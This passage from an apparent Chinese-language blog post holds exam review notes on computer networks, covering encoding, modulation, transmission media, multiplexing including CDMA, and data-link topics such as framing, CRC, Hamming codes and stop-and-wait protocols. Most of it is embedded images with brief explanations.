src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203201118024.png" alt="image-20211203201118024"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h3 id="基带信号和宽带信号"><a href="#基带信号和宽带信号" class="headerlink" title="基带信号和宽带信号"></a>基带信号和宽带信号</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203201237536.png" alt="image-20211203201237536"></p><h3 id="编码和调制"><a href="#编码和调制" class="headerlink" title="编码和调制"></a>编码和调制</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203201510121.png" alt="image-20211203201510121"></p><h3 id="计算机发送信息的过程"><a href="#计算机发送信息的过程" class="headerlink" title="计算机发送信息的过程"></a>计算机发送信息的过程</h3><p>用QQ举例，当我们点击发送的时候，信息从应用层一层层封装，到物理层。由于计算机网络产生的都是二进制（数字数据），因此需要把数据转成数字信号（基带信号），这就是编码的过程。这里就有问题了，1怎么表示，0怎么表示，怎么区分01 ，因此就有了下面各种各样的编码方式。然后需要把基带信号转成模拟信号，这就是调制。模拟信号发送到目的后，还需要把模拟信号转成数字信号。</p><h3 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203202449660.png" alt="image-20211203202449660"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203202851503.png" alt="image-20211203202851503"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203202918659.png" alt="image-20211203202918659"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203202958183.png" alt="image-20211203202958183"></p><h2 id="调制"><a href="#调制" class="headerlink" title="调制"></a>调制</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203203222387.png" alt="image-20211203203222387"></p><h2 id="模拟信号编码成数字信号"><a href="#模拟信号编码成数字信号" class="headerlink" title="模拟信号编码成数字信号"></a>模拟信号编码成数字信号</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203203309371.png" alt="image-20211203203309371"></p><h2 id="编码调制总结"><a href="#编码调制总结" class="headerlink" title="编码调制总结"></a>编码调制总结</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203203516116.png" alt="image-20211203203516116"></p><h2 id="传输介质"><a href="#传输介质" class="headerlink" title="传输介质"></a>传输介质</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204620283.png" alt="image-20211203204620283"></p><h3 id="双绞线"><a href="#双绞线" class="headerlink" title="双绞线"></a>双绞线</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204648497.png" alt="image-20211203204648497"></p><h3 id="同轴电缆"><a href="#同轴电缆" class="headerlink" title="同轴电缆"></a>同轴电缆</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204740059.png" alt="image-20211203204740059"></p><h3 id="光纤"><a href="#光纤" class="headerlink" title="光纤"></a>光纤</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204752095.png" alt="image-20211203204752095"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204807967.png" alt="image-20211203204807967"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204822111.png" alt="image-20211203204822111"></p><h3 id="非导向性传输介质"><a href="#非导向性传输介质" class="headerlink" title="非导向性传输介质"></a>非导向性传输介质</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204909138.png" alt="image-20211203204909138"></p><h2 id="传输介质总结"><a href="#传输介质总结" class="headerlink" title="传输介质总结"></a>传输介质总结</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204934047.png" alt="image-20211203204934047"></p><h2 id="频分复用、时分复用和统计时分复用"><a href="#频分复用、时分复用和统计时分复用" class="headerlink" title="频分复用、时分复用和统计时分复用"></a><strong>频分复用、时分复用和统计时分复用</strong></h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203211321164.png" alt="image-20211203211321164"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203211355562.png" alt="image-20211203211355562"></p><p>时分复用类似于操作系统中时间片轮转算法。</p><p><strong>时分复用可能会造成线路资源的浪费</strong> 。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203211644430.png" alt="image-20211203211644430"></p><h2 id="波分复用"><a href="#波分复用" class="headerlink" title="波分复用"></a><strong>波分复用</strong></h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203211817076.png" alt="image-20211203211817076"></p><h2 id="码分复用-CDMA"><a href="#码分复用-CDMA" class="headerlink" title="码分复用(CDMA)"></a>码分复用(CDMA)</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203211901529.png" alt="image-20211203211901529"></p><h3 id="码片序列-chip-sequence"><a href="#码片序列-chip-sequence" class="headerlink" title="码片序列(chip sequence)"></a>码片序列(chip sequence)</h3><ul><li><p>每一个比特时间划分为 m 个短的间隔，称为码片 (chip)。</p></li><li><p>每个站被指派一个唯一的 m bit 码片序列。<br>1、如发送比特 1，则发送自己的 m bit 码片序列。<br>2、如发送比特 0，则发送该码片序列的二进制反码。</p></li><li><p>例如，S 站的 8 bit 码片序列是 00011011。<br>1、发送比特 1 时，就发送序列 00011011，<br>2、发送比特 0 时，就发送序列 11100100。</p><p><strong>请注意：按惯例，码片中的1写为+1，0写为-1</strong><br><em><strong>故S 站的码片序列记为：(–1 –1 –1 +1 +1 –1 +1 +1)</strong></em></p></li><li><p>假定S站要发送信息的数据率为 b bit/s。由于每一个比特要转换成 m 个比特的码片，因此 S 站实际上发送的数据率提高到 mb bit/s，同时 S 站所占用的频带宽度也提高到原来数值的 m 倍。</p></li></ul><h3 id="CDMA的特点"><a href="#CDMA的特点" class="headerlink" title="CDMA的特点"></a>CDMA的特点</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203212854734.png" alt="image-20211203212854734"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203213502828.png" alt="image-20211203213502828"></p><h3 id="CDMA的工作原理"><a href="#CDMA的工作原理" class="headerlink" title="CDMA的工作原理"></a>CDMA的工作原理</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203214431035.png" alt="image-20211203214431035"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203212953463.png" alt="image-20211203212953463"></p><h2 id="物理层设置"><a href="#物理层设置" class="headerlink" title="物理层设置"></a>物理层设置</h2><h3 id="中继器"><a href="#中继器" class="headerlink" title="中继器"></a>中继器</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203205047632.png" alt="image-20211203205047632"></p><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203205442280.png" alt="image-20211203205442280"></p><h2 id="第二章题目总结"><a href="#第二章题目总结" class="headerlink" title="第二章题目总结:)"></a>第二章题目总结:)</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203210352997.png" alt="image-20211203210352997"></p><h3 id="考研题-1"><a href="#考研题-1" class="headerlink" title="考研题"></a>考研题</h3><p>考点：香农定理和奈氏准则</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203210431047.png" alt="image-20211203210431047"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203215417554.png" alt="image-20211203215417554"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203210539888.png" alt="image-20211203210539888"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203210806922.png" alt="image-20211203210806922"></p><h3 id="易忘"><a href="#易忘" class="headerlink" title="易忘"></a>易忘</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203213605057.png" alt="image-20211203213605057"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203215714119.png" alt="image-20211203215714119"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203215751743.png" alt="image-20211203215751743"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203215820000.png" alt="image-20211203215820000"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203215905369.png" alt="image-20211203215905369"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203220817881.png" alt="image-20211203220817881"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203220846812.png" alt="image-20211203220846812"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203221002189.png" alt="image-20211203221002189"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203221028048.png" alt="image-20211203221028048"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203221102759.png" alt="image-20211203221102759"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203221115879.png" alt="image-20211203221115879"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203220903814.png" alt="image-20211203220903814"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203220910888.png" alt="image-20211203220910888"></p><h3 id="定义-amp-记忆"><a href="#定义-amp-记忆" class="headerlink" title="定义&amp;记忆"></a>定义&amp;记忆</h3><p>1、在采用曼彻斯特编码的情况下编码前和编码后的比特率相差两倍。在曼彻斯特编码的时候，由于曼彻斯特编码，在一个周期内要发送两次脉冲，也就是比要发送的数据多出一倍，因此需要的带宽是原始基带的两倍。</p><p>2、波特率等于每秒钟可能发生的信号变化的次数。</p><h1 id="第三章：数据链路层"><a href="#第三章：数据链路层" class="headerlink" title="第三章：数据链路层"></a>第三章：数据链路层</h1><h2 id="数据链路层导图"><a href="#数据链路层导图" class="headerlink" title="数据链路层导图"></a>数据链路层导图</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204160843787.png" alt="image-20211204160843787"></p><h2 id="数据链路层的基本概念"><a href="#数据链路层的基本概念" class="headerlink" title="数据链路层的基本概念"></a>数据链路层的基本概念</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204160951111.png" alt="image-20211204160951111"></p><h2 id="数据链路层功能"><a href="#数据链路层功能" class="headerlink" title="数据链路层功能"></a>数据链路层功能</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204161034772.png" alt="image-20211204161034772"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204161047041.png" alt="image-20211204161047041"></p><h2 id="数据链路层面临的问题"><a href="#数据链路层面临的问题" class="headerlink" title="数据链路层面临的问题"></a>数据链路层面临的问题</h2><p>1、封装成帧</p><p>2、透明传输</p><p>3、差错检测</p><h2 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204161218546.png" alt="image-20211204161218546"></p><p>首先需要说明的是封装成帧是发送的时候做的。</p><p>同时，从这里可以看出，数据链路层对bit数据进行处理，不需要关心数字信号模拟信号的转换，而网络层则不需要关心bit数据，直接处理由链路层处理好的数据就行了。这里也能看出分层的好处，可谓各司其职但是又相辅相成。</p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204161922169.png" alt="image-20211204161922169"></p><h2 id="封装成帧的几种方法"><a href="#封装成帧的几种方法" class="headerlink" title="封装成帧的几种方法"></a>封装成帧的几种方法</h2><h3 id="1、字符统计法"><a href="#1、字符统计法" class="headerlink" title="1、字符统计法"></a>1、字符统计法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162228240.png" alt="image-20211204162228240"></p><h3 id="2、字符填充法"><a href="#2、字符填充法" class="headerlink" title="2、字符填充法"></a>2、字符填充法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162256089.png" alt="image-20211204162256089"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162311360.png" alt="image-20211204162311360"></p><h3 id="3、零比特填充法"><a href="#3、零比特填充法" class="headerlink" title="3、零比特填充法"></a>3、零比特填充法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162340007.png" alt="image-20211204162340007"></p><h3 id="4、违规编码法"><a href="#4、违规编码法" class="headerlink" title="4、违规编码法"></a>4、违规编码法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162431212.png" alt="image-20211204162431212"></p><p>目前最常使用的是零比特填充法和违规编码法</p><h2 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h2><h3 id="差错从何而来"><a href="#差错从何而来" class="headerlink" title="差错从何而来"></a>差错从何而来</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162856431.png" alt="image-20211204162856431"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204162945064.png" alt="image-20211204162945064"></p><h3 id="差错检验：奇偶校验码"><a href="#差错检验：奇偶校验码" class="headerlink" title="差错检验：奇偶校验码"></a>差错检验：奇偶校验码</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204163543389.png" alt="image-20211204163543389"></p><h3 id="差错检测：CRC循环冗余码"><a href="#差错检测：CRC循环冗余码" class="headerlink" title="差错检测：CRC循环冗余码**"></a>差错检测：CRC循环冗余码**</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204163714935.png" alt="image-20211204163714935"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204163725569.png" alt="image-20211204163725569"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204163742132.png" alt="image-20211204163742132"></p><h3 id="纠错编码：海明码"><a href="#纠错编码：海明码" class="headerlink" title="纠错编码：海明码"></a>纠错编码：海明码</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204163830279.png" alt="image-20211204163830279"></p><h4 id="海明距离"><a href="#海明距离" class="headerlink" title="海明距离"></a>海明距离</h4><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204163904693.png" alt="image-20211204163904693"></p><p>当海明距离（码距）为1时，无法检错。</p><p>若海明码需要检测d位错误，则需要的码距是d+1</p><p>若海明码需要纠错d位错误，则需要的码距是2*d + 1</p><h4 id="1、确定校验码位数r"><a href="#1、确定校验码位数r" class="headerlink" title="1、确定校验码位数r"></a>1、确定校验码位数r</h4><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204164434866.png" alt="image-20211204164434866"></p><h4 id="2、确定校验码的位置"><a href="#2、确定校验码的位置" class="headerlink" title="2、确定校验码的位置"></a>2、确定校验码的位置</h4><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204164457149.png" alt="image-20211204164457149"></p><h4 id="3、求出校验码的值"><a href="#3、求出校验码的值" class="headerlink" title="3、求出校验码的值"></a>3、求出校验码的值</h4><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204164515773.png" alt="image-20211204164515773"></p><h3 id="4、检错-amp-纠错"><a href="#4、检错-amp-纠错" class="headerlink" title="4、检错&amp;纠错"></a>4、检错&amp;纠错</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204164536481.png" alt="image-20211204164536481"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204164548235.png" alt="image-20211204164548235"></p><h2 id="差错控制的总结"><a href="#差错控制的总结" class="headerlink" title="差错控制的总结"></a>差错控制的总结</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204164609765.png" alt="image-20211204164609765"></p><p>差错控制并不是实现可靠传输。</p><p>可靠传输是指： 发送端发送什么，接收端就接受什么。如果发送的数据丢失或者错误，则需要保证发送端能够重新发送数据。</p><p>而且差错控制是在bit数据层面，可靠传输是在帧的层面。</p><h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204212532249.png" alt="image-20211204212532249"></p><p>在学习运输层的时候，我们也会学习流量控制。</p><p>数据链路层的流量控制是点对点的，而传输层的流量控制是端到端的。</p><h3 id="流量控制的方法"><a href="#流量控制的方法" class="headerlink" title="流量控制的方法"></a>流量控制的方法</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204212718810.png" alt="image-20211204212718810"></p><h3 id="可靠传输、滑动窗口、流量控制"><a href="#可靠传输、滑动窗口、流量控制" class="headerlink" title="可靠传输、滑动窗口、流量控制"></a>可靠传输、滑动窗口、流量控制</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204212814218.png" alt="image-20211204212814218"></p><h2 id="停止-等待协议"><a href="#停止-等待协议" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h2><h3 id="停等协议属于哪一层？"><a href="#停等协议属于哪一层？" class="headerlink" title="停等协议属于哪一层？"></a>停等协议属于哪一层？</h3><p>在传输介质不发达的时间，由于在数据传输的时候容易发送丢包，等错误，因此把停等协议划分到数据链路层。</p><p>但是现在的传输介质已经很可靠了，因此为了提高传输速度，把停等协议划分到传输层了。</p><h3 id="停等协议解决的一些问题"><a href="#停等协议解决的一些问题" class="headerlink" title="停等协议解决的一些问题"></a>停等协议解决的一些问题</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213207723.png" alt="image-20211204213207723"></p><h3 id="无差错的情况"><a href="#无差错的情况" class="headerlink" title="无差错的情况"></a>无差错的情况</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213246796.png" alt="image-20211204213246796"></p><h3 id="有差错情况-–-数据帧丢失"><a href="#有差错情况-–-数据帧丢失" class="headerlink" title="有差错情况 – 数据帧丢失"></a>有差错情况 – 数据帧丢失</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213420625.png" alt="image-20211204213420625"></p><h3 id="有差错情况-–-ACK丢失"><a href="#有差错情况-–-ACK丢失" class="headerlink" title="有差错情况 – ACK丢失"></a>有差错情况 – ACK丢失</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213503406.png" alt="image-20211204213503406"></p><h3 id="有差错情况-–-ACK迟到"><a href="#有差错情况-–-ACK迟到" class="headerlink" title="有差错情况 – ACK迟到"></a>有差错情况 – ACK迟到</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213647841.png" alt="image-20211204213647841"></p><h3 id="停等协议性能分析"><a href="#停等协议性能分析" class="headerlink" title="停等协议性能分析"></a>停等协议性能分析</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213708930.png" alt="image-20211204213708930"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213735406.png" alt="image-20211204213735406"></p><h2 id="后退N帧协议GBN"><a href="#后退N帧协议GBN" class="headerlink" title="后退N帧协议GBN"></a>后退N帧协议GBN</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211204213852439.png" alt="image-20211204213852439"></p><p><img 